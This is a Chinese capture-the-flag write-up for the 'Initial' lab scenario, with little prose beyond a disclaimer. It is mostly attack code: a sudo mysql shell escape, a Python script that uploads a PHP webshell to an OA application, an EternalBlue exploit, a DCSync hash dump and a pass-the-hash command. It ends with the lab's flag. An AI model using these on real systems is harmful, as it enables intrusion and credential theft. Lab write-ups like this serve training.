# 春秋云境仿真场景WP：Initial

> 原文: https://www.ctfiot.com/184189.html
> ID: 184189

点击蓝字 关注我们

免责声明

本文发布的工具和脚本，仅用作测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断。

如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关内容。

文中所涉及的技术、思路及工具等相关知识仅供安全为目的的学习使用，任何人不得将其应用于非法用途及盈利等目的，间接使用文章中的任何工具、思路及技术，我方对于由此引起的法律后果概不负责。

欢迎关注SecHub网络安全社区，SecHub网络安全社区目前邀请式注册，邀请码获取见公众号菜单【邀请码】

#

企业简介

赛克艾威 – 网络安全解决方案提供商

       北京赛克艾威科技有限公司（简称：赛克艾威），成立于2016年9月，提供全面的安全解决方案和专业的技术服务，帮助客户保护数字资产和网络环境的安全。

安全评估|渗透测试|漏洞扫描|安全巡检

代码审计|钓鱼演练|应急响应|安全运维

重大时刻安保|企业安全培训

联系方式

电话｜010-86460828 

官网｜https://sechub.com.cn

关注我们

公众号：sechub安全

哔哩号：SecHub官方账号


```
sudo mysql -e '! find / -name flag*'
```



```
sudo mysql -e '! cat /root/flag/flag01.txt'
```



```
import requests

session = requests.session()

url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
 'rempass': '0',
 'jmpass': 'false',
 'device': '1625884034525',
 'ltype': '0',
 'adminuser': 'YWRtaW4=',
 'adminpass': 'YWRtaW4xMjM=',
 'yanzm': ''
}

r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```



```
vim/etc/proxychains4.conf
```



```
proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.1.21
exploit
```



```
load kiwi

kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit # 导出域内所有用户的信息(包括哈希值)
```



```
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type UsersAdministratorflagflag03.txt"
```



```
flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716945493.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1716945494.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1716945495.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716945496.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1716945498.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716945499.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1716945501.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716945503.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716945505.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716945507.png)